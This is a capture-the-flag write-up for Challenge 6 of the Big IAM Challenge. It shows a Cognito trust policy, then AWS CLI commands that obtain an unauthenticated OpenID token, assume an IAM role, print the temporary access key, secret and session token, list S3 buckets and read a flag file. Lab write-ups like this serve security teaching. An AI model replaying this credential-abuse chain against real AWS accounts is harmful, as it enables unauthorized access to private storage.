# Challenge 6

**Challenge 6:** https://bigiamchallenge.com/challenge/6

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/9cb6d78a-ac4c-4c77-a7d1-281dabb34981)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/c5d73db0-7371-4017-8557-eaff2467d679)

View page source:

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/2fbf31b7-51b4-406d-8e9b-febde05930e3)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/597cb099-c920-4bda-ae9c-67811ab8087c)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/1eca7893-0fe5-4a54-b363-c51d8fca7dbe)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/07a4a39f-1222-45f4-bcb5-d35019731a58)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/c59e9be8-2271-4e3b-91fc-e1a2d3100529)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/b6957837-0ef0-47f2-940e-a6710d0b930c)

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

```
{
    &quot;Version&quot;: &quot;2012-10-17&quot;,
    &quot;Statement&quot;: [
        {
            &quot;Effect&quot;: &quot;Allow&quot;,
            &quot;Principal&quot;: {
                &quot;Federated&quot;: &quot;cognito-identity.amazonaws.com&quot;
            },
            &quot;Action&quot;: &quot;sts:AssumeRoleWithWebIdentity&quot;,
            &quot;Condition&quot;: {
                &quot;StringEquals&quot;: {
                    &quot;cognito-identity.amazonaws.com:aud&quot;: &quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;
                }
            }
        }
    ]
}
```

```
> aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
{
    "IdentityId": "us-east-1:157d6171-eeff-ca70-783e-5fc1c07e5602"
}
> aws cognito-identity get-open-id-token --identity-id "us-east-1:157d6171-eeff-ca70-783e-5fc1c07e5602"
{
    "IdentityId": "us-east-1:157d6171-eeff-ca70-783e-5fc1c07e5602",
    "Token": "eyJraWQiOiJ1cy1lYXN0LTE1IiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWVmZi1jYTcwLTc4M2UtNWZjMWMwN2U1NjAyIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3MTc0MDY2NjIsImlhdCI6MTcxNzQwNjA2Mn0.ceUNZFlOg2q1aiBrN5sGhn9XXHj2BtCcE4MG8VVC4Usjsa_8ZszkQo1SGPMnP0AXT3gUjNStR7DPA0b1U875OxZ7knwn-xpY2KVjixXfTX_MY0WKDMOlI7XfuvYvsdFNkS7zv2YI0BcPQB8Y1ZbG7_-N5ZPAMqrsJZdZOMVRrrOcdTSeozqrT1M80xvCjTwaitHmQUyv6tE6jU9Ws4GOD81Pf7hK1X_Gsx0XZXdoWqPsm72kVtiTp4bRq-_lkMyjEmukNElVRX3HVeSBTZ6-6OgkcEm57Uo1tQpmw_2tRvN5D33qggNRBUMcpxJmjz4y65v0AOJ7DzoBJo_oVFUvGw"
}
> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name my-session --web-identity-token "eyJraWQiOiJ1cy1lYXN0LTE1IiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWVmZi1jYTcwLTc4M2UtNWZjMWMwN2U1NjAyIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3MTc0MDY2NjIsImlhdCI6MTcxNzQwNjA2Mn0.ceUNZFlOg2q1aiBrN5sGhn9XXHj2BtCcE4MG8VVC4Usjsa_8ZszkQo1SGPMnP0AXT3gUjNStR7DPA0b1U875OxZ7knwn-xpY2KVjixXfTX_MY0WKDMOlI7XfuvYvsdFNkS7zv2YI0BcPQB8Y1ZbG7_-N5ZPAMqrsJZdZOMVRrrOcdTSeozqrT1M80xvCjTwaitHmQUyv6tE6jU9Ws4GOD81Pf7hK1X_Gsx0XZXdoWqPsm72kVtiTp4bRq-_lkMyjEmukNElVRX3HVeSBTZ6-6OgkcEm57Uo1tQpmw_2tRvN5D33qggNRBUMcpxJmjz4y65v0AOJ7DzoBJo_oVFUvGw"
{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXIMWQMOV4",
        "SecretAccessKey": "famBr6mqQXcsVFy9lYVWGKKPnmyc1o8EQXMdauEk",
        "SessionToken": "FwoGZXIvYXdzEBMaDGVS984p7hEEBjUWuCKiAgPfKvN/lHfWpkrx0GDo5XtKPKQ5ZWf6OVKJ2zzzgeVg8tMagBK99oUn7AtMnGnb3R7++C6Vab8awhhLgtl/Q4NEV/7+durLM2vf6ZSRUvRteCIVpiCORfDFw0Tv4JrcU/LkwnhuBQOKEp+VgIM8vyUHlloUv21Nb5taTH9bNj3TUQmsAN+PK1TbBstXRRdyvT7XeTCGW3z0F/0/HwP0aI4puJ7O1d2u5wX9saJFYqumHmeK0+50xfoG76vtZHHCvkfFlXwuV7nGAvYa/kVfD7ccv9Xpd4WAIH2Abas2IPxYjNGj3nD4Y3peTcJt5muSVZVASQeHzWLLbDYoNf7YKw+yyytOe4p7RvziavFN3RNUIjfqYjTozu2bNq3R04wpWYwIKOiT9rIGMpYBnx86TQW+upJW47hSDrBpZMWS9G+iV8ewEwQQkEuBgj6XOjkk6oesE6tmg9DC7J8U9uSmxZEfYyjge047oPErHYA9anSqm+ak/4U4Vnx57bvp/t+s/8OKXZ98u7AtJICaKxsTC4zewlBBxr2v3X2qcrWjYxttV/KQvxk6dN3fHANS/mvckCKHOK9Z5DZ9zo1AES4tAwFT",
        "Expiration": "2024-06-03T10:16:24Z"
    },
    "SubjectFromWebIdentityToken": "us-east-1:157d6171-eeff-ca70-783e-5fc1c07e5602",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:my-session",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/my-session"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}
```

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $nano ~/.aws/credentials
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $tail -n 4 ~/.aws/credentials
[challenge6]
AWS_ACCESS_KEY_ID=ASIARK7LBOHXIMWQMOV4
AWS_SECRET_ACCESS_KEY=famBr6mqQXcsVFy9lYVWGKKPnmyc1o8EQXMdauEk
AWS_SESSION_TOKEN=FwoGZXIvYXdzEBMaDGVS984p7hEEBjUWuCKiAgPfKvN/lHfWpkrx0GDo5XtKPKQ5ZWf6OVKJ2zzzgeVg8tMagBK99oUn7AtMnGnb3R7++C6Vab8awhhLgtl/Q4NEV/7+durLM2vf6ZSRUvRteCIVpiCORfDFw0Tv4JrcU/LkwnhuBQOKEp+VgIM8vyUHlloUv21Nb5taTH9bNj3TUQmsAN+PK1TbBstXRRdyvT7XeTCGW3z0F/0/HwP0aI4puJ7O1d2u5wX9saJFYqumHmeK0+50xfoG76vtZHHCvkfFlXwuV7nGAvYa/kVfD7ccv9Xpd4WAIH2Abas2IPxYjNGj3nD4Y3peTcJt5muSVZVASQeHzWLLbDYoNf7YKw+yyytOe4p7RvziavFN3RNUIjfqYjTozu2bNq3R04wpWYwIKOiT9rIGMpYBnx86TQW+upJW47hSDrBpZMWS9G+iV8ewEwQQkEuBgj6XOjkk6oesE6tmg9DC7J8U9uSmxZEfYyjge047oPErHYA9anSqm+ak/4U4Vnx57bvp/t+s/8OKXZ98u7AtJICaKxsTC4zewlBBxr2v3X2qcrWjYxttV/KQvxk6dN3fHANS/mvckCKHOK9Z5DZ9zo1AES4tAwFT
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws sts get-caller-identity --profile challenge6
{
    "UserId": "AROARK7LBOHXASFTNOIZG:my-session",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/my-session"
}
```


```
┌─[✗]─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 ls --profile challenge6
2024-06-02 18:19:19 challenge-website-storage-215f327
2023-06-04 22:37:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 18:37:44 thebigiamchallenge-admin-storage-abf1321
2023-06-04 22:01:02 thebigiamchallenge-storage-9979f4b
2023-06-05 18:58:31 wiz-privatefiles
2023-06-05 18:58:31 wiz-privatefiles-x1000
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 ls s3://wiz-privatefiles-x1000 --profile challenge6
2023-06-06 01:12:27       4220 cognito2.png
2023-06-05 18:58:35         40 flag2.txt
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt - --profile challenge6
{wiz:open-sesame-or-shell-i-say-openid}
```


